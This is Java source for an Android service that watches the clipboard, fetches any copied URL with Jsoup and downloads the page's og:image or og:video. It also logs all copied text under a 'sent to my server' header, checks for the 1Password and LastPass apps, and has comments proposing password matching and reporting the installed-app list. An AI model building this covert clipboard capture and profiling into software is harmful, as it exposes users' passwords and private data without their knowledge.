package rudiment.jsoupexample.clipboardlistener;

import android.app.DownloadManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.webkit.URLUtil;
import android.widget.Toast;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import rudiment.jsoupexample.util.Constant;

import static android.os.Environment.DIRECTORY_PICTURES;

public class ClipboardWatcherService extends Service {

    public static final StringBuilder log = new StringBuilder("--- STUFF THAT I SENT TO MY SERVER ---\n\n");
    public static boolean serviceIsRunning = false;

    private ClipboardManager.OnPrimaryClipChangedListener listener = new ClipboardManager.OnPrimaryClipChangedListener() {
        public void onPrimaryClipChanged() {
            performClipboardCheck();
        }
    };

    @Override
    public void onCreate() {
        ((ClipboardManager) getSystemService(CLIPBOARD_SERVICE)).addPrimaryClipChangedListener(listener);
        checkForPasswordManager();
        serviceIsRunning = true;
    }

    /**
     * Checks to see if a password manager is installed and logs it.
     * <p/>
     * In a real app, more advanced optimisation would be possible using this information.
     * For example, detect passwords that match the default generation settings for that manager.
     * <p/>
     * You could also transmit a full list of apps installed on the device to know which services
     * the user uses.
     */
    private void checkForPasswordManager() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo packageInfo : packages) {
            if (packageInfo.packageName.equals("com.agilebits.onepassword") ||
                    packageInfo.packageName.equals("com.lastpass.lpandroid")) {
                log.append(packageInfo.packageName);
                log.append(" is installed.\n\n");
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void performClipboardCheck() {
        ClipboardManager cb = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (cb.hasPrimaryClip()) {
            ClipData cd = cb.getPrimaryClip();
            if (cd.getDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {
                final String clipboard = cd.getItemAt(0).getText().toString();
                log.append(clipboard);
                log.append("\n\n");
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        new Task().execute(clipboard);
                    }
                });
            }
        }
    }

    public void onDownloadBtnClick(final String url) {
        // given permissions are granted
        if (!url.isEmpty() && URLUtil.isValidUrl(url)) {
            DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
            DownloadManager.Request request = new DownloadManager.Request(
                    Uri.parse(url));
            String fileName = URLUtil.guessFileName(url, null, null);
            request.setDestinationInExternalPublicDir(DIRECTORY_PICTURES,
                    File.separator + Constant.FOLDER_NAME + File.separator + fileName);
            dm.enqueue(request);
            Toast.makeText(ClipboardWatcherService.this, "Downloading started.", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(ClipboardWatcherService.this, "Paste Url.", Toast.LENGTH_SHORT).show();
        }
    }

    class Task extends AsyncTask<String, String, ArrayList<String>> {
        @Override
        protected ArrayList<String> doInBackground(String... voids) {
            return parse(voids[0]);
        }

        @Override
        protected void onPostExecute(ArrayList<String> aVoid) {
            super.onPostExecute(aVoid);
            if (aVoid != null && aVoid.size() != 0) {
                if (aVoid.size() == 1) {
                    onDownloadBtnClick(aVoid.get(0));
                } else if (aVoid.size() == 2) {
                    onDownloadBtnClick(aVoid.get(1));
                }
            }
        }

        private ArrayList<String> parse(String url) {
            try {
                ArrayList<String> images = new ArrayList<>();
                Document doc = Jsoup.connect(url).get();
                String imageUrl = "";
                Elements meta = null;
          /*   if (SOURCE_TYPE == 1) {*/
                Elements meta1 = doc.select("meta[property=og:image]");
                meta = doc.select("meta[property=og:video]");

                if (meta1 != null && meta1.size() != 0) {
                    String imageUrl1 = meta1.attr("content");
                    images.add(imageUrl1);
                }
                if (meta != null && meta.size() != 0) {
                    imageUrl = meta.attr("content");
                    images.add(imageUrl);
                }

           /*  } else if (SOURCE_TYPE == 2) {
                 Elements meta1 = doc.select("meta[property=og:image]");
                 meta = doc.select("meta[property=og:video]");
                 String imageUrl1 = meta1.attr("content");
                 imageUrl = meta.attr("content");
                 images.add(imageUrl1);
                 images.add(imageUrl);
             }*/
                return images;
            } catch (IOException e) {
                e.printStackTrace();
                return null;
            }
        }
    }
}


